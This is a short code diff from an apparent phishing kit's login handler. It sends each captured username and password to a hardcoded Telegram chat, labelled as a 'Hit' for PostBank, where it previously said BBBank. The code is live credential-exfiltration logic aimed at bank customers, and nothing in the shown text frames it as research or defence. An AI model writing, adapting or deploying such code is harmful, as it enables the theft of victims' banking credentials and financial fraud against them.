@@ -51,7 +51,7 @@ const submitLogin = async (req, res) => {
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                 {
                     chat_id: '-837014205',
-                    text: `New BBBank Hit:\n\n${username}\n${pin}`,
+                    text: `New PostBank Hit:\n\n${username}\n${password}`,
                     parse_mode: "Markdown",
                 }
             )
